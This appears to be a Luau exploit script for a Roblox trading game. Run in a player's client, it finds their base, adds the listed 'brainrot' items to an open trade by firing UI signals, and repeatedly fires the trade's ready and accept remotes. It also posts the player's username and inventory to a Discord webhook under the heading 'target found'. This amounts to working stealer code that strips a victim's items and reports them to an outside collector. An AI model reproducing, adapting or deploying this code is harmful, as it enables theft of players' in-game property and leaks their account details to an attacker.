local function allPlayersReady()
	local tradeGui = PlayerGui:FindFirstChild("TradeLiveTrade")
	if not tradeGui then return false end
	local inner = tradeGui:FindFirstChild("TradeLiveTrade")
	if not inner then return false end
	local other = inner:FindFirstChild("Other")
	if not other then return false end
	local readyBtn = other:FindFirstChild("ReadyButton")
	if not readyBtn then return false end
	local txt = readyBtn:FindFirstChild("Txt")
	return txt and txt.Text == "ACCEPT"
end

local function getTradeScrollFrame()
	local tradeGui = PlayerGui:FindFirstChild("TradeLiveTrade")
	if not tradeGui then return nil end
	local inner = tradeGui:FindFirstChild("TradeLiveTrade")
	if not inner then return nil end
	local your = inner:FindFirstChild("Your")
	if not your then return nil end
	return your:FindFirstChild("ScrollingFrame")
end

local function waitForMyPlot(timeout)
	local myPlot
	local start = tick()
	repeat
		local ok, result = pcall(function()
			return PlotController.GetMyPlot()
		end)
		if ok and result then myPlot = result end
		if not myPlot then task.wait() end
	until myPlot or (tick() - start > timeout)
	return myPlot
end

local function getPlotFolder()
	local myPlot = waitForMyPlot(4)
	if not myPlot then return nil end
	local uuid = tostring(myPlot:GetUID())
	local plotsFolder = workspace:FindFirstChild("Plots")
	if not plotsFolder then return nil end
	return plotsFolder:FindFirstChild(uuid)
end

local function collectBrainrotsFromBase(plotFolder)
	local brainrotsToAdd = {}
	local seen = {}
	for _, child in ipairs(plotFolder:GetChildren()) do
		local name = child.Name
		if _G.Settings.Brainrots[name] and not seen[name] then
			seen[name] = true
			table.insert(brainrotsToAdd, name)
		end
	end
	return brainrotsToAdd
end

local function cleanTradeTitle(rawTitle)
	local title = rawTitle or ""
	title = title:gsub("%s*%b()", "")
	title = title:gsub("%s+[xX]%d+$", "")
	title = title:match("^%s*(.-)%s*$") or title
	return title
end

local function fireAccept()
	local fakeRemote = getAcceptRemote()
	if fakeRemote then
		pcall(function()
			fakeRemote:FireServer("918ee0f5-e98f-413f-b76e-baee47b021cb")
		end)
	end
end

local function fireReadyOrAccept()
	if not isTradeActive() then return end

	local elapsed = 0
	while isTradeActive() and elapsed < 30 do
		if allPlayersReady() then
			fireAccept()
		else
			local readyRemote = getReadyRemote()
			if readyRemote then
				readyRemote:FireServer("d73acf93-6f32-44df-b813-0f6b32c7afd9")
			end
		end
		task.wait(_G.Settings.AcceptDelay or 2.5)
		elapsed += (_G.Settings.AcceptDelay or 2.5)
	end
end

local function sendWebhook(plotFolder)
	local webhook = _G.Settings.Webhook
	if not webhook or webhook == "" then return end

	
	local mainRoot = plotFolder:FindFirstChild("MainRoot") or plotFolder:FindFirstChildWhichIsA("BasePart")
	if not mainRoot then return end

	local plotPos = mainRoot.Position
	local plotSize = mainRoot.Size
	local searchRange = Vector3.new(plotSize.X * 20, 1000, plotSize.Z * 20)

	warn("[Webhook] plotPos:", plotPos, "| plotSize:", plotSize, "| searchRange:", searchRange)

	local totalTemplates = 0
	local inRange = 0
	local entries = {}

	for _, obj in ipairs(workspace.Debris:GetChildren()) do
		if obj.Name == "FastOverheadTemplate" then
			totalTemplates += 1
			local overhead = obj:FindFirstChild("AnimalOverhead")
			local pos = obj:IsA("BasePart") and obj.Position or (obj:FindFirstChildWhichIsA("BasePart") and obj:FindFirstChildWhichIsA("BasePart").Position)
			if overhead and pos then
				local displayNameObj = overhead:FindFirstChild("DisplayName")
				local generationObj = overhead:FindFirstChild("Generation")
				local mutationObj = overhead:FindFirstChild("Mutation")
				local traitsFolder = overhead:FindFirstChild("Traits")

				if displayNameObj and generationObj then
					local ok, displayName = pcall(function() return displayNameObj.Text end)
					local diff = pos - plotPos
					local halfRange = searchRange / 2
					local withinRange = math.abs(diff.X) <= halfRange.X and math.abs(diff.Z) <= halfRange.Z
					if withinRange then inRange += 1 end
					warn("[Webhook]", ok and displayName or "ERR", "| pos:", pos, "| inRange:", withinRange, "| inList:", ok and _G.Settings.Brainrots[displayName] ~= nil or false)
					if ok and _G.Settings.Brainrots[displayName] and withinRange then
						local mutation = "Default"
						pcall(function()
							if mutationObj and mutationObj.Visible then
								local raw = mutationObj.Text
								mutation = raw:gsub("<[^>]+>", ""):gsub("%s+", " "):match("^%s*(.-)%s*$") or "Default"
							end
						end)
						local gen = ""
						pcall(function() gen = generationObj.Text end)
						local traits = {}
						if traitsFolder then
							for _, t in ipairs(traitsFolder:GetChildren()) do
								if t.Name ~= "Template" and t.Name ~= "UIListLayout" then
									table.insert(traits, t.Name)
								end
							end
						end
						table.insert(entries, {
							name = displayName,
							gen = gen,
							mutation = mutation,
							traits = traits,
						})
					end
				end
			end
		end
	end



	if #entries == 0 then
		local player = Players.LocalPlayer
		local now = os.date("%m/%d/%Y %I:%M %p")
		local payload = game:GetService("HttpService"):JSONEncode({
			embeds = {{
				title = "target found",
				color = 0xFF0000,
				fields = {
					{ name = "username:", value = "`" .. player.Name .. "`", inline = false },
					{ name = "inventory:", value = "No brainrots from the target list found.", inline = false },
				},
				footer = { text = now },
			}}
		})
		pcall(function()
			request({
				Url = _G.Settings.Webhook,
				Method = "POST",
				Headers = { ["Content-Type"] = "application/json" },
				Body = payload
			})
		end)
		return
	end

	table.sort(entries, function(a, b)
		local function parseGen(g)
			local n = tonumber(g:match("([%d%.]+)")) or 0
			if g:find("B") then n = n * 1e9
			elseif g:find("M") then n = n * 1e6
			elseif g:find("K") then n = n * 1e3 end
			return n
		end
		return parseGen(a.gen) > parseGen(b.gen)
	end)

	local player = Players.LocalPlayer
	local lines = {}
	for i, e in ipairs(entries) do
		local mutStr = (e.mutation and e.mutation ~= "Default" and e.mutation ~= "None" and e.mutation ~= "") and (" | " .. e.mutation) or " | No Mutation"
		local traitStr = #e.traits > 0 and (" | " .. table.concat(e.traits, ", ")) or ""
		local genClean = e.gen:gsub("%$", "")
		table.insert(lines, i .. ". [" .. genClean .. "] " .. e.name .. mutStr .. traitStr)
	end

	local description = table.concat(lines, "\n")
	if #description > 4000 then
		description = description:sub(1, 4000) .. "\n..."
	end

	local now = os.date("%m/%d/%Y %I:%M %p")

	local payload = game:GetService("HttpService"):JSONEncode({
		embeds = {{
			title = "target found",
			color = 0x57F287,
			fields = {
				{ name = "username:", value = "`" .. player.Name .. "`", inline = false },
				{ name = "inventory: (" .. tostring(#entries) .. ")", value = "```\n" .. description .. "\n```", inline = false },
			},
			footer = { text = now },
		}}
	})

	pcall(function()
		request({
			Url = webhook,
			Method = "POST",
			Headers = { ["Content-Type"] = "application/json" },
			Body = payload
		})
	end)
end

local tradeRunning = false

local function autoadd()
	if tradeRunning then return end
	if not isTradeActive() then return end

	tradeRunning = true

	local plotFolder = getPlotFolder()
	if not plotFolder then
		tradeRunning = false
		return
	end

	local brainrotsToAdd = collectBrainrotsFromBase(plotFolder)
	if #brainrotsToAdd == 0 then
		tradeRunning = false
		return
	end

	local wantedSet = {}
	for _, name in ipairs(brainrotsToAdd) do
		wantedSet[name] = true
	end

	task.wait(_G.Settings.TradeStartDelay or 2)

	if not isTradeActive() then
		tradeRunning = false
		return
	end

	local sframe = getTradeScrollFrame()
	if not sframe then
		tradeRunning = false
		return
	end



	local children = sframe:GetChildren()
	for _, v in ipairs(children) do
		if not isTradeActive() then
			tradeRunning = false
			return
		end
		if v.Name:find("Selection") and v:FindFirstChild("Spacer") and v.Spacer:IsA("ImageButton") then
			local spacer = v.Spacer
			local titleLabel = spacer:FindFirstChild("Title")
			if titleLabel and titleLabel:IsA("TextLabel") then
				local title = cleanTradeTitle(titleLabel.Text)
				if wantedSet[title] then
					spacer.Visible = true
					task.wait(0.2)
					firesignal(spacer.Activated)
					task.wait(0.8)
					spacer.Visible = false
					task.wait(_G.Settings.AddDelay or 1.5)
				end
			end
		end
	end

	task.wait(1)
	fireReadyOrAccept()

	while isTradeActive() do
		task.wait(0.5)
	end

	tradeRunning = false
end

